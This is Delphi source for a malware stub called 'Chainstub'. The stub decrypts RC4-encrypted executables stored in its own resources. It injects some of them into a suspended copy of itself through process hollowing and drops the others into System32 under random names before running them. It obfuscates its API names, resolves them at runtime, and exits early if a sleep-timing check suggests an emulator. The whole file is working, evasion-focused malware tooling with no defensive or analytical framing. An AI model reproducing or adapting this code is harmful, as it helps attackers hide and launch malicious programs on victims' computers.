program Chainstub;
{$Warnings Off}
{$IMAGEBASE $10000000}
uses
  Windows,
  ShellApi,
  uRC4,
  Unit1 in 'Unit1.pas' {Form1};

//DEAD SLEEPY

type
  TSections = array [0..0] of TImageSectionHeader;
Var
  reprendtnthreadxryrikkxx: function(hThread: THandle): DWORD; stdcall;
  placethreddctxt: function(hThread: THandle; const lpContext: TContext): BOOL; stdcall;
  virtuallcosiexeexex: function(hProcess: THandle; lpAddress: Pointer; dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer; stdcall;
  lislamemoireprocessx: function(hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer; nSize: DWORD; var lpNumberOfBytesRead: DWORD): BOOL; stdcall;
  obtientlethxredccssttx: function(hThread: THandle; var lpContext: TContext): BOOL; stdcall;
  creeunxproecess: function(lpApplicationName: PChar; lpCommandLine: PChar; lpProcessAttributes, lpThreadAttributes: PSecurityAttributes; bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: PChar; const lpStartupInfo: TStartupInfo; var lpProcessInformation: TProcessInformation): BOOL; stdcall;
  ecrirelamemoryxsx: function(hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer; nSize: DWORD; var lpNumberOfBytesWritten: DWORD): BOOL; stdcall;
  xobtentproccadr: function(hModule: HMODULE; lpProcName: LPCSTR): FARPROC; stdcall;
  xxobtienmodeedfilenom: function(hModule: HINST; lpFilename: PAnsiChar; nSize: DWORD): DWORD; stdcall;

function strinngoaintrre(Value: ShortString): Integer;
// Value   = eax
// Result  = eax
asm
  push ebx
  push esi

  mov esi,eax
  xor eax,eax
  movzx ecx,Byte([esi]) // read length byte
  cmp ecx,0
  je @exit

  movzx ebx,Byte([esi+1])
  xor edx,edx // edx = 0
  cmp ebx,45  // check for negative '-' = #45
  jne @loop

  dec edx // edx = -1
  inc esi // skip '-'
  dec ecx

  @loop:
    inc   esi
    movzx ebx,Byte([esi])
    imul  eax,10
    sub   ebx,48 // '0' = #48
    add   eax,ebx
    dec   ecx
  jnz @loop

  mov ecx,eax
  and ecx,edx
  shl ecx,1
  sub eax,ecx

  @exit:
  pop esi
  pop ebx
end;


function dansastringoer(Value: Integer): ShortString;
// Value  = eax
// Result = edx
asm
  push ebx
  push esi
  push edi

  mov edi,edx
  xor ecx,ecx
  mov ebx,10
  xor edx,edx

  cmp eax,0 // check for negative
  setl dl
  mov esi,edx
  jnl @reads
  neg eax

  @reads:
    mov  edx,0   // edx = eax mod 10
    div  ebx     // eax = eax div 10
    add  edx,48  // '0' = #48
    push edx
    inc  ecx
    cmp  eax,0
  jne @reads

  dec esi
  jnz @positive
  push 45 // '-' = #45
  inc ecx

  @positive:
  mov [edi],cl // set length byte
  inc edi

  @writes:
    pop eax
    mov [edi],al
    inc edi
    dec ecx
  jnz @writes

  pop edi
  pop esi
  pop ebx
end;
function GetWindowsDirectory: string;
var
directriond : array [0..MAX_Path] of char;
begin
asm
lea eax, directriond
test eax, eax
push eax
xor eax, eax
call GetWindowsDirectoryA
end;
result := string(directriond)+'\'
end;

function rescourcedonnee(var Size:integer; pSectionName: pchar): pointer;
var
  ResourceLocation: HRSRC;
  ResourceHandle: THandle;
begin
  ResourceLocation := FindResource(hInstance, pSectionName, RT_RCDATA);
  Size := SizeOfResource(hInstance, ResourceLocation);
  ResourceHandle := LoadResource(hInstance, ResourceLocation);
  Result := LockResource(ResourceHandle);
  If Result <> NIL Then
    FreeResource(ResourceHandle);
end;
(*****************************************
 mcrotraduis() Function

 Translates a macro to a string.
 Example: TMP = Temp Directory String
 ****************************************)

Function mcrotraduis(Macro: String): String;
Var
  Size          :Cardinal;
  Output        :Array[0..MAX_Path] of Char;
Begin
  Result := '';
  FillChar(Output, SizeOf(Output), #0);

  Size := SizeOf(Output);
  Size := GetEnvironmentVariable(PChar(Macro), Output, Size);
  If (Size > 0) Then
    Result := Output;
End;
function wholefunc(dummy: integer): integer;
begin
asm // here
nop // is
end; // our NOP
end;

Function hvethepatcheoeo(Kind:Integer):STRING;
Begin
if Kind=0 Then Result:=mcrotraduis('TEMP');
if Kind=1 Then Result:=mcrotraduis('SystemRoot');
if Kind=2 Then Result:=(mcrotraduis('SystemRoot') + '\System32');
END;

Function obtainstrrting(nomdlarescs:String):String;
Var
  pointrerebouffr         :Pointer;
  BufferLength          :Integer;
  BufferString          :AnsiString;
begin
 // Result:='';
  pointrerebouffr := rescourcedonnee(BufferLength, PChar(nomdlarescs));
 // If (Assigned(pointrerebouffr)) Then
    Begin
     SetLength(BufferString, BufferLength);
     Move(pointrerebouffr^, BufferString[1], BufferLength);
     Result:=BufferString;
    End;
end;

function obtientailaligner(Size: dword; Alignment: dword): dword;
begin
  if ((Size mod Alignment) = strinngoaintrre('0')) then
  begin
    Result := Size;
  end
  else
  begin
    Result := ((Size div Alignment) + strinngoaintrre('1')) * Alignment;
  end;
end;

function dumyyuselesss(dummy: integer): integer;
begin
asm // here
nop // is
end; // our NOP
end;

function taildeimage(Image: pointer): dword;
var
  Alignment: dword;
  ImageNtHeaders: PImageNtHeaders;
  PSections: ^TSections;
  SectionLoop: dword;
begin
  ImageNtHeaders := pointer(dword(dword(Image)) + dword(PImageDosHeader(Image)._lfanew));
  Alignment := ImageNtHeaders.OptionalHeader.SectionAlignment;
  if ((ImageNtHeaders.OptionalHeader.SizeOfHeaders mod Alignment) = strinngoaintrre('0')) then
  begin
    Result := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
  end
  else
  begin
    Result := ((ImageNtHeaders.OptionalHeader.SizeOfHeaders div Alignment) + strinngoaintrre('1')) * Alignment;
  end;
  PSections := pointer(pchar(@(ImageNtHeaders.OptionalHeader)) + ImageNtHeaders.FileHeader.SizeOfOptionalHeader);
  for SectionLoop := strinngoaintrre('0') to ImageNtHeaders.FileHeader.NumberOfSections - strinngoaintrre('1') do
  begin
    if PSections[SectionLoop].Misc.VirtualSize <> strinngoaintrre('0') then
    begin
      if ((PSections[SectionLoop].Misc.VirtualSize mod Alignment) = strinngoaintrre('0')) then
      begin
        Result := Result + PSections[SectionLoop].Misc.VirtualSize;
      end
      else
      begin
        Result := Result + (((PSections[SectionLoop].Misc.VirtualSize div Alignment) + strinngoaintrre('1')) * Alignment);
      end;
    end;
  end;
end;

Procedure asigneapis;
Var
  DLLHandle     :THandle;
Begin
  DLLHandle := LoadLibrary(pChar('kernel32.dll'));   //kernel32.dll
  @xobtentproccadr      :=  GetProcAddress(DLLHandle, PChar('GetProcAddress'));  //GetProcAddress
  @reprendtnthreadxryrikkxx        := xobtentproccadr(DLLHandle, pChar('ResumeThread')); //ResumeThread
  @placethreddctxt    := xobtentproccadr(DLLHandle, pChar('SetThreadContext'));  //SetThreadContext
  @lislamemoireprocessx   := xobtentproccadr(DLLHandle, pChar('ReadProcessMemory'));//ReadProcessMemory
  @obtientlethxredccssttx    := xobtentproccadr(DLLHandle, pChar('GetThreadContext')); //GetThreadContext
  @creeunxproecess       := xobtentproccadr(DLLHandle, pChar('CreateProcessA'));   //CreateProcessA
  @ecrirelamemoryxsx  := xobtentproccadr(DLLHandle, pChar('WriteProcessMemory')); //WriteProcessMemory
  @virtuallcosiexeexex      := xobtentproccadr(DLLHandle, pChar('VirtualAllocEx'));  //VirtualAllocEx
  @xxobtienmodeedfilenom   := xobtentproccadr(DLLHandle, pChar('GetModuleFileNameA'));//GetModuleFileNameA
End;

procedure creeprocesusxe(FileMemory: pointer);
var
  BaseAddress, Bytes, HeaderSize, InjectSize,  SectionLoop, SectionSize: dword;
  Context: TContext;
  FileData: pointer;
  ImageNtHeaders: PImageNtHeaders;
  InjectMemory: pointer;
  ProcInfo: TProcessInformation;
  PSections: ^TSections;
  StartInfo: TStartupInfo;
  Injectdirectriond    :Array[0..MAX_Path] Of Char;
begin
  asigneapis;
  FillChar(Injectdirectriond, MAX_Path, #0);
  xxobtienmodeedfilenom(0, Injectdirectriond, MAX_Path);
  ImageNtHeaders := pointer(dword(dword(FileMemory)) + dword(PImageDosHeader(FileMemory)._lfanew));
  InjectSize := taildeimage(FileMemory);
  GetMem(InjectMemory, InjectSize);
  try
    FileData := InjectMemory;
    HeaderSize := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
    PSections := pointer(pchar(@(ImageNtHeaders.OptionalHeader)) + ImageNtHeaders.FileHeader.SizeOfOptionalHeader);
    for SectionLoop := strinngoaintrre('0') to ImageNtHeaders.FileHeader.NumberOfSections - strinngoaintrre('1') do
    begin
      if PSections[SectionLoop].PointerToRawData < HeaderSize then HeaderSize := PSections[SectionLoop].PointerToRawData;
    end;
    CopyMemory(FileData, FileMemory, HeaderSize);
    FileData := pointer(dword(FileData) + obtientailaligner(ImageNtHeaders.OptionalHeader.SizeOfHeaders, ImageNtHeaders.OptionalHeader.SectionAlignment));
    for SectionLoop := strinngoaintrre('0') to ImageNtHeaders.FileHeader.NumberOfSections - strinngoaintrre('1') do
    begin
      if PSections[SectionLoop].SizeOfRawData > strinngoaintrre('0') then
      begin
        SectionSize := PSections[SectionLoop].SizeOfRawData;
        if SectionSize > PSections[SectionLoop].Misc.VirtualSize then SectionSize := PSections[SectionLoop].Misc.VirtualSize;
        CopyMemory(FileData, pointer(dword(FileMemory) + PSections[SectionLoop].PointerToRawData), SectionSize);
        FileData := pointer(dword(FileData) + obtientailaligner(PSections[SectionLoop].Misc.VirtualSize, ImageNtHeaders.OptionalHeader.SectionAlignment));
      end
      else
      begin
        if PSections[SectionLoop].Misc.VirtualSize <> strinngoaintrre('0')then FileData := pointer(dword(FileData) + obtientailaligner(PSections[SectionLoop].Misc.VirtualSize, ImageNtHeaders.OptionalHeader.SectionAlignment));
      end;
    end;
    ZeroMemory(@StartInfo, SizeOf(StartupInfo));
    ZeroMemory(@Context, SizeOf(TContext));
    creeunxproecess(NIL, pChar(String(Injectdirectriond)), NIL, NIL, False, CREATE_SUSPENDED, NIL, NIL, StartInfo, ProcInfo);
    Context.ContextFlags := CONTEXT_FULL;
    obtientlethxredccssttx(ProcInfo.hThread, Context);
    lislamemoireprocessx(ProcInfo.hProcess, pointer(Context.Ebx + strinngoaintrre('8')), @BaseAddress, strinngoaintrre('4'), Bytes);
    virtuallcosiexeexex(ProcInfo.hProcess, pointer(ImageNtHeaders.OptionalHeader.ImageBase), InjectSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ecrirelamemoryxsx(ProcInfo.hProcess, pointer(ImageNtHeaders.OptionalHeader.ImageBase), InjectMemory, InjectSize, Bytes);
    ecrirelamemoryxsx(ProcInfo.hProcess, pointer(Context.Ebx + strinngoaintrre('8')), @ImageNtHeaders.OptionalHeader.ImageBase, strinngoaintrre('4'), Bytes);
    Context.Eax := ImageNtHeaders.OptionalHeader.ImageBase + ImageNtHeaders.OptionalHeader.AddressOfEntryPoint;
    placethreddctxt(ProcInfo.hThread, Context);
    reprendtnthreadxryrikkxx(ProcInfo.hThread);
  finally
    FreeMemory(InjectMemory);
  end;
end;
function sdhhgkjdsvjjsmk(dummy: integer): integer;
begin
asm // here
nop // is
end; // our NOP
end;

Function emulateerrreanti:Boolean;
Var
UpTime            :DWORD;
UpTimeAfterSleep  :Dword;
Begin
   UpTime  := GetTickCount;
   Sleep(500);
   UpTimeAfterSleep := GetTickCount;
   if ( UpTimeAfterSleep - UpTime ) < 500 Then
   Result:= True Else Result:= False;
end;

VAR
i,i2,i3,i4,iloop:integer;
Buffer:AnsiString;
pointrerebouffr         :Pointer;
Key,directriond:String;
F:File;
Begin
if (emulateerrreanti) Then Exitprocess(0);
Key:=obtainstrrting('KEY');
  //Messagebox(0,Pchar(kEY),'KEY',16);
   IF Key='' Then Exitprocess(0);
   For i:=1 to 6 do
   begin
   if obtainstrrting('M'+dansastringoer(I))<>'' Then
   begin
   Buffer       := obtainstrrting('M'+dansastringoer(I));
   For iloop:=0 To 512 do
   begin
   Buffer       := Rc4(Buffer,Key);
   end;
   GetMem(pointrerebouffr, Length(Buffer));       //convert STRING to POINTER
   Move(Buffer[1], pointrerebouffr^, Length(Buffer));
   Begin
    Try
     creeprocesusxe(pointrerebouffr);
    Finally
     FreeMem(pointrerebouffr);
   End;
   End;
  end;

  For i2:=1 to 6 do
   begin
  if obtainstrrting('T'+dansastringoer(I))<>'' Then
   begin
     Buffer       := obtainstrrting('T'+dansastringoer(I));
     For iloop:=0 To 512 do
     begin
     Buffer       := Rc4(Buffer,Key);
     end;
     directriond:= hvethepatcheoeo(2)+dansastringoer(Random(500))+'.exe';
     AssignFile(F, directriond);
     Rewrite(F, 1);
     If (IOResult = 0) Then
     Begin
      BlockWrite(F, Buffer[1], Length(Buffer));
      CloseFile(F);
     End;
     ShellExecute(0, 'open', PChar(directriond), nil, nil, 1);
  End;
 end;
 end;

 For i3:=1 to 6 do
   begin
   if obtainstrrting('S'+dansastringoer(I2))<>'' Then
 begin
     Buffer       := obtainstrrting('S'+dansastringoer(I2));
     For iloop:=0 To 512 do
     begin
     Buffer       := Rc4(Buffer,Key);
     end;
     directriond:= hvethepatcheoeo(2)+dansastringoer(Random(500))+'.exe';
     AssignFile(F, directriond);
     Rewrite(F, 1);
     If (IOResult = 0) Then
     Begin
      BlockWrite(F, Buffer[1], Length(Buffer));
      CloseFile(F);
     End;
     ShellExecute(0, 'open', PChar(directriond), nil, nil, 1);
  End;
 end;


   For i3:=1 to 6 do
   begin
 if obtainstrrting('W'+dansastringoer(I3))<>'' Then
   begin
     Buffer       := obtainstrrting('W'+dansastringoer(I3));
     For iloop:=0 To 512 do
     begin
     Buffer       := Rc4(Buffer,Key);
     end;
     directriond:= hvethepatcheoeo(2)+dansastringoer(Random(500))+'.exe';
     AssignFile(F, directriond);
     Rewrite(F, 1);
     If (IOResult = 0) Then
     Begin
      BlockWrite(F, Buffer[1], Length(Buffer));
      CloseFile(F);
     End;
     ShellExecute(0, 'open', PChar(directriond), nil, nil, 1);
  End;
 end;

end.
